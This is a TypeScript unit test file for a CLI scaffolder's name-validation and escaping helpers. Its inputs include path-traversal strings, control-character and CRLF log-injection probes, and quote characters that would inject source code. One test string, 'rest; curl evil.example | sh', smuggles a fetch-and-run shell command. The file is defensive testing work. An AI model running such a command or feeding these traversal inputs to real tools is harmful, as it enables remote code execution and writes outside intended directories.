import { describe, it } from '@std/testing/bdd';
import { expect } from '@std/expect';
import {
  deriveNames,
  escapeName,
  escapeTerminalControls,
  hasControlCharacter,
  isIdentifierSafe,
  isPathSegmentSafe,
} from '../../src/utils/names.ts';

describe('deriveNames', () => {
  const inputs = ['user-profile', 'UserProfile', 'userProfile', 'user_profile', 'user profile'];

  for (const input of inputs) {
    it(`derives identical forms from "${input}"`, () => {
      const names = deriveNames(input);
      expect(names.kebab).toBe('user-profile');
      expect(names.camel).toBe('userProfile');
      expect(names.pascal).toBe('UserProfile');
      expect(names.screaming).toBe('USER_PROFILE');
    });
  }

  it('preserves the raw input verbatim', () => {
    expect(deriveNames('  UserProfile ').raw).toBe('  UserProfile ');
  });

  it('handles a single lowercase word', () => {
    expect(deriveNames('user')).toEqual({
      raw: 'user',
      kebab: 'user',
      camel: 'user',
      pascal: 'User',
      screaming: 'USER',
    });
  });

  it('handles a single Pascal word', () => {
    const names = deriveNames('User');
    expect(names.kebab).toBe('user');
    expect(names.camel).toBe('user');
    expect(names.pascal).toBe('User');
  });

  it('splits three or more words', () => {
    const names = deriveNames('createUserProfileCommand');
    expect(names.kebab).toBe('create-user-profile-command');
    expect(names.pascal).toBe('CreateUserProfileCommand');
    expect(names.screaming).toBe('CREATE_USER_PROFILE_COMMAND');
  });

  it('collapses repeated separators', () => {
    expect(deriveNames('user--profile__name').kebab).toBe('user-profile-name');
  });

  it('returns empty forms for an empty input', () => {
    expect(deriveNames('')).toEqual({
      raw: '',
      kebab: '',
      camel: '',
      pascal: '',
      screaming: '',
    });
  });

  it('returns empty forms for a separator-only input', () => {
    expect(deriveNames('---').kebab).toBe('');
  });

  it('lowercases the tail of an all-caps segment', () => {
    expect(deriveNames('API').pascal).toBe('Api');
  });

  it('keeps digits attached to their word', () => {
    expect(deriveNames('oauth2-client').pascal).toBe('Oauth2Client');
  });
});

describe('isIdentifierSafe', () => {
  it('accepts an ordinary name', () => {
    expect(isIdentifierSafe(deriveNames('user-profile'))).toBe(true);
  });

  it('accepts a reserved word, which every schematic prefixes or suffixes', () => {
    for (const word of ['class', 'new', 'for', 'return', 'function', 'default']) {
      expect(isIdentifierSafe(deriveNames(word))).toBe(true);
    }
  });

  it('accepts a name containing digits after the first character', () => {
    expect(isIdentifierSafe(deriveNames('oauth2-client'))).toBe(true);
  });

  // These survive normalisation intact — `deriveNames('.')` returns `.` for every
  // form — so the empty check passes them straight through. `setu adopt` derives
  // its member name from a directory, which made `--dir .` produce `apps/.`.
  it('rejects a path segment carrying no letter at all', () => {
    for (const input of ['.', '..', './']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(false);
    }
  });

  it('rejects a name that normalises to nothing', () => {
    // Would emit `class Service` at the hidden path src/services/.service.ts.
    for (const raw of ['', '___', '---', '   ']) {
      expect(isIdentifierSafe(deriveNames(raw))).toBe(false);
    }
  });

  it('rejects a digit-leading name', () => {
    // Would emit `class 2faService`, which does not parse.
    for (const raw of ['2fa', '3d-model', '0auth']) {
      expect(isIdentifierSafe(deriveNames(raw))).toBe(false);
    }
  });

  // The kebab is joined into a filesystem path by every name-taking verb — the
  // `new` project dir, the `generate app`/`adopt` member dir, and the artifact
  // file name — and `deriveNames` preserves `/` verbatim: it is not a separator
  // it normalizes away. A name carrying one would write the scaffold outside the
  // intended directory, so the guard rejects it at the shared mechanism.
  it('rejects a name whose derived kebab carries a path separator', () => {
    for (const input of ['..', '.', '../sibling', '../../..', 'a/b']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(false);
    }
  });

  // A NUL byte and an over-long component pass every other rule and reach the
  // filesystem, which rejects them mid-flight (`TypeError: ... NUL byte`,
  // `File name too long`) as an error nothing caught — an uncaught rejection,
  // not a refusal. Both are refused here, before any filesystem access.
  it('rejects a name whose derived kebab carries a control character', () => {
    for (const input of ['a\u0000b', 'ok\u0000', '\u007fx']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(false);
    }
  });

  // `\` is a path separator on Windows, and Deno honours it there, so
  // `..\sibling` escapes the target directory exactly as `../sibling` does on
  // every platform. A C1 control (U+0085, NEL) is a line break to several
  // terminals, so the control-character rule covers the whole Cc category.
  it('rejects a Windows path separator and a C1 control character', () => {
    for (const input of ['..\\sibling', 'a\\b', 'a\u0085b', 'a\u009fb']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(false);
      expect(isPathSegmentSafe(deriveNames(input))).toBe(false);
    }
  });

  it('rejects a name longer than a filesystem filename component', () => {
    expect(isIdentifierSafe(deriveNames('a'.repeat(256)))).toBe(false);
    expect(isIdentifierSafe(deriveNames('a'.repeat(255)))).toBe(true);
  });
});

describe('escapeName', () => {
  it('renders control characters as escapes so a refusal stays one line', () => {
    expect(escapeName('../sib\r\nINJECTED: scaffold complete')).toBe(
      '../sib\\u000d\\u000aINJECTED: scaffold complete',
    );
    expect(escapeName('a\u0000b')).toBe('a\\u0000b');
  });

  it('leaves an ordinary name verbatim', () => {
    expect(escapeName('user-profile')).toBe('user-profile');
  });
});

// The project directory is a path segment and never an identifier, so `new`
// takes only the path rules. On `main` before M99e, `setu new 3d-shop` and
// `setu new 2048` scaffolded; the shared identifier guard silently refused both.
describe('isPathSegmentSafe', () => {
  it('accepts a digit-leading or letterless segment the identifier rule refuses', () => {
    for (const input of ['3d-shop', '2048', 'oauth2-client', 'shop']) {
      expect(isPathSegmentSafe(deriveNames(input))).toBe(true);
    }
  });

  it('rejects the empty, current and parent segments', () => {
    for (const input of ['', '___', '.', '..', './']) {
      expect(isPathSegmentSafe(deriveNames(input))).toBe(false);
    }
  });

  it('rejects separators, control characters and over-long segments', () => {
    for (const input of ['../sibling', 'a/b', 'a\\b', 'a\u0000b', 'a'.repeat(256)]) {
      expect(isPathSegmentSafe(deriveNames(input))).toBe(false);
    }
    expect(isPathSegmentSafe(deriveNames('a'.repeat(255)))).toBe(true);
  });
});

// Every derived form a generating verb interpolates is an identifier (`class
// <Pascal>Service`, `<camel>Middleware`, `<SCREAMING>_EVENT`) and the kebab also
// lands inside string literals (`@Injectable({ token: '<kebab>-service' })`). A
// name carrying punctuation broke both: `a:b` emitted `class A:bService`, and
// `x'y` closed the token literal early, which is source injection from argv.
describe('isIdentifierSafe — every derived form is an identifier', () => {
  it('rejects punctuation that survives normalization', () => {
    for (const input of ['a:b', 'a.b', 'a@b', 'a+b', "x'y", 'a"b', 'a`b', 'a$b', 'a!b', 'a(b)']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(false);
    }
  });

  it('accepts Unicode letters, digits after the first, and the normalized separators', () => {
    for (const input of ['café', 'order-item', 'order_item', 'order item', 'oauth2-client']) {
      expect(isIdentifierSafe(deriveNames(input))).toBe(true);
    }
  });
});

// A project directory lands in manifests as a string (`wrangler.toml`'s
// `name = "<kebab>"`), so a quote there broke the emitted TOML.
describe('isPathSegmentSafe — a portable project-name charset', () => {
  it('rejects quotes and punctuation, and a leading dot', () => {
    for (const input of ["x'y", 'x"y', 'a:b', 'a@b', '.hidden', '..foo', 'a$b']) {
      expect(isPathSegmentSafe(deriveNames(input))).toBe(false);
    }
  });

  it('accepts letters, digits, dots and hyphens', () => {
    for (const input of ['my.app', '3d-shop', 'café', 'v1.2-api']) {
      expect(isPathSegmentSafe(deriveNames(input))).toBe(true);
    }
  });
});

describe('escapeTerminalControls', () => {
  // The sink escape: every control character the CLI never writes on purpose.
  // The line feed and the tab are the two it does write, so both survive.
  const ESCAPED: readonly (readonly [string, string])[] = [
    ['carriage return', '\r'],
    ['escape', String.fromCharCode(27)],
    ['NUL', String.fromCharCode(0)],
    ['DEL', String.fromCharCode(0x7f)],
    ['C1 next line', '\u0085'],
    ['line separator', '\u2028'],
    ['paragraph separator', '\u2029'],
  ];
  for (const [label, char] of ESCAPED) {
    it(`escapes ${label}`, () => {
      const out = escapeTerminalControls(`a${char}b`);
      expect(out.includes(char)).toBe(false);
      expect(out).toMatch(/^a\\u[0-9a-f]{4}b$/);
    });
  }

  it('keeps the line feed and the tab', () => {
    expect(escapeTerminalControls('a\n\tb')).toBe('a\n\tb');
  });

  it('leaves printable text, including non-ASCII, untouched', () => {
    expect(escapeTerminalControls('café `setu new` ✓')).toBe('café `setu new` ✓');
  });
});

describe('hasControlCharacter', () => {
  it('reports every character escapeName escapes', () => {
    for (const char of ['\n', '\r', '\t', String.fromCharCode(27), '\u0085', '\u2028']) {
      expect(hasControlCharacter(`a${char}b`)).toBe(true);
      expect(escapeName(`a${char}b`)).not.toBe(`a${char}b`);
    }
  });

  it('reports nothing for printable text', () => {
    expect(hasControlCharacter('rest; curl evil.example | sh')).toBe(false);
    expect(hasControlCharacter('café')).toBe(false);
  });

  // The regex is not global, so repeated calls cannot drift on lastIndex.
  it('answers the same on repeated calls', () => {
    expect([1, 2, 3].map(() => hasControlCharacter('a\nb'))).toEqual([true, true, true]);
  });
});
